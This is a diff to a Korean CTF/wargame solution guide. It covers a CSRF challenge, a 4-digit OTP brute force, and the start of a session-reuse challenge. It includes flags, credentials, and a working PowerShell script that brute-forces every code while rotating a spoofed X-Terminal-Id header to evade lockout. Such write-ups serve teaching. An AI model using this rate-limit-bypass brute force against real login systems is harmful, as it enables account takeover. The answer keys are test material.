@@ -121,18 +121,20 @@
 <p><strong>플래그:</strong> <code>BREW{ch4_04_csrf_seal_nest}</code></p>
 <p><strong>취약점:</strong> 서버가 둥지 봉인 요청을 처리할 때 로그인 세션만 확인하고, CSRF 토큰은 확인하지 않습니다. 다만 "정말 외부에서 온 요청인지"는 브라우저가 자동으로 보내는 표준 헤더 <code>Sec-Fetch-Site</code>로 판정합니다 — 주소창에 직접 입력하거나(<code>none</code>) 사이트 안에서 이동하면(<code>same-origin</code>) 거부되고, 외부 HTML 파일에서 자동으로 이동한 경우(<code>cross-site</code>)만 통과합니다. 그래서 반드시 위 3-4번처럼 별도 HTML 파일을 만들어 열어야 하며, 이 주소를 브라우저 주소창에 직접 입력하는 것만으로는 통하지 않습니다. 상태를 바꾸는 작업을 GET 요청으로 처리하는 것 자체도 결함입니다 (CSRF — Cross-Site Request Forgery).</p>
 <h2>4장 · 05 (중) — 창고 긴급 개방 시스템</h2>
-<p><strong>풀이 흐름:</strong> 공개된 계정(<code>headroaster</code> / <code>roast2026</code>)으로 로그인합니다 → "창고 긴급 개방"에 4자리 보안 코드가 추가로 필요한 것을 확인합니다 → 몇 번을 틀려도 막히지 않는 것을 확인하고, 0000-9999를 자동으로 전부 시도하는 스크립트를 돌립니다 → 맞는 코드로 플래그를 확인합니다.</p>
+<p><strong>풀이 흐름:</strong> 공개된 계정(<code>headroaster</code> / <code>roast2026</code>)으로 로그인합니다 → "창고 긴급 개방"에 4자리 보안 코드가 추가로 필요한 것을 확인합니다 → 코드를 5번 틀려 "단말기 잠김"이 뜨는 것을 확인합니다 → 잠금 안내문에서 <code>X-Terminal-Id</code> 헤더로 단말기를 구분한다는 것을 알아냅니다 → 요청마다 이 헤더 값을 다르게 보내 잠금을 무력화하면서 0000-9999를 자동으로 전부 시도하는 스크립트를 돌립니다 → 맞는 코드로 플래그를 확인합니다.</p>
+<p><strong>화면 힌트:</strong> 5번 틀리면 뜨는 "단말기 잠김" 화면에 "단말기(<code>X-Terminal-Id: 기본</code>)에서 시도 횟수를 초과했습니다. 다른 입구 단말기에서 시도하십시오"라고 적혀 있습니다. 여기서 단말기 구분이 <code>X-Terminal-Id</code>라는 요청 헤더 값으로 이루어진다는 것, 그리고 "다른 단말기에서 시도하라"는 말 자체가 이 헤더 값을 클라이언트가 바꿔 보낼 수 있다는 걸 암시합니다.</p>
 <p><strong>실행:</strong></p>
 <ol>
 <li><code>https://kload-wargame.onrender.com/ch4/05/</code>에서 <code>headroaster</code> / <code>roast2026</code>으로 로그인합니다. "보안 코드 확인" 화면으로 이동합니다.</li>
-<li>아무 코드나 입력해 "확인"을 눌러 보고, 틀려도 잠기거나 막히지 않는 것을 확인합니다.</li>
-<li>PowerShell에서 아래 스크립트를 실행해 0000부터 9999까지 코드를 자동으로 전부 시도합니다.</li>
+<li>아무 코드나 5번 입력해 "확인"을 눌러 보면, "단말기 잠김" 화면과 함께 <code>X-Terminal-Id</code> 헤더 이름이 드러납니다.</li>
+<li>PowerShell에서 아래 스크립트를 실행합니다. 요청마다 <code>X-Terminal-Id</code> 값을 매번 다르게 보내서(예: <code>gate-0</code>, <code>gate-1</code>, ...) 단말기 잠금을 피하면서 0000부터 9999까지 코드를 자동으로 전부 시도합니다.</li>
 </ol>
 <pre><code>   $session = $null
    Invoke-WebRequest -Uri "https://kload-wargame.onrender.com/ch4/05/login" -Method POST -Body @{id="headroaster"; pw="roast2026"} -SessionVariable session -UseBasicParsing | Out-Null
    for ($i = 0; $i -le 9999; $i++) {
        $code = $i.ToString("0000")
-       $resp = Invoke-WebRequest -Uri "https://kload-wargame.onrender.com/ch4/05/verify-code" -Method POST -Body @{code=$code} -WebSession $session -UseBasicParsing
+       $headers = @{ "X-Terminal-Id" = "gate-$i" }
+       $resp = Invoke-WebRequest -Uri "https://kload-wargame.onrender.com/ch4/05/verify-code" -Method POST -Body @{code=$code} -Headers $headers -WebSession $session -UseBasicParsing
        if ($resp.Content -match "BREW\{[^}]*\}") {
            Write-Host "맞는 코드: $code"
            Write-Host $matches[0]
@@ -143,7 +145,7 @@
 <li>맞는 코드가 출력되며 그 응답 안에 플래그가 함께 나옵니다.</li>
 </ol>
 <p><strong>플래그:</strong> <code>BREW{ch4_05_otp_bruteforce}</code></p>
-<p><strong>취약점:</strong> 2단계 인증 코드가 4자리(0000-9999, 1만 가지)뿐이고, 틀린 시도 횟수를 서버가 전혀 세거나 제한하지 않습니다. 코드 공간이 좁고 잠금 장치도 없으니, 자동화 스크립트로 전부 시도하면 반드시 뚫립니다 (2단계 인증 자체가 있다고 안전한 것이 아니라, 그 값 공간과 시도 횟수 제한까지 갖춰야 의미가 있다는 사례).</p>
+<p><strong>취약점:</strong> 2단계 인증 코드가 4자리(0000-9999, 1만 가지)뿐이고, 같은 단말기로 5번 틀리면 잠그는 시도 횟수 제한이 걸려 있습니다. 하지만 "어느 단말기인지"를 서버가 클라이언트가 보낸 <code>X-Terminal-Id</code> 헤더 값만 보고 판단하고 따로 검증하지 않습니다. 그래서 요청마다 이 헤더 값을 바꿔 보내면 매번 "새 단말기"로 취급되어 잠금이 걸리지 않고, 결국 코드 공간 전체를 제한 없이 시도할 수 있습니다 (잠금 장치가 있어도, 그 장치가 클라이언트가 조작 가능한 값에 의존하면 무력화될 수 있다는 사례 — Rate Limit Bypass via spoofable header).</p>
 <h2>4장 · 06 (중) — 배전반 로그아웃</h2>
 <p><strong>풀이 흐름:</strong> 로그인해서 세션 쿠키 값을 미리 복사해둡니다 → 로그아웃합니다 → 복사해둔 쿠키 값을 다시 넣어봅니다 → 여전히 로그인된 상태로 접속되는 것을 확인합니다.</p>
 <p><strong>실행:</strong></p>
